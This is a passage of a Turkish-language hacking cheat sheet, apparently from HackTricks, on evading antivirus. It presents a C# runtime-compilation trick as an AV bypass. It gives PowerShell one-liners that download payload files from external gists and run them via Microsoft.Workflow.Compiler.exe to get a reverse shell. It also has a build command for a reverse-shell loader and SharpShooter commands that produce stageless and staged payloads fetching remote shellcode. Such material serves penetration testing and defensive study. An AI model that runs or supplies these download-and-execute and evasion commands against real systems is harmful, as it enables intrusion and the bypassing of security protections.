using System.CodeDom.Compiler;
using System.Reflection;
using Microsoft.CSharp;

namespace AVBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            string code = @"
                using System;

                namespace HelloWorld
                {
                    class Program
                    {
                        static void Main(string[] args)
                        {
                            Console.WriteLine(""Hello, World!"");
                        }
                    }
                }
            ";

            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = "Bypass.exe";

            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);

            if (results.Errors.HasErrors)
            {
                foreach (CompilerError error in results.Errors)
                {
                    Console.WriteLine(error.ErrorText);
                }
            }
            else
            {
                Assembly assembly = results.CompiledAssembly;
                Type programType = assembly.GetType("HelloWorld.Program");
                MethodInfo mainMethod = programType.GetMethod("Main");
                mainMethod.Invoke(null, null);
            }
        }
    }
}
```

Bu örnekte, C# kodu bir dize olarak tanımlanır ve `CSharpCodeProvider` sınıfı kullanılarak derlenir. Derleme sonucunda oluşan derleme sonucu, `Assembly` sınıfı aracılığıyla yürütülür ve `HelloWorld.Program` sınıfının `Main` yöntemi çağrılır. Bu, AV çözümünün dikkatini çekmeden C# kodunu çalıştırmanın bir yoludur.
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve yürütme:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

C# obfuscators listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Daha Fazla

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>
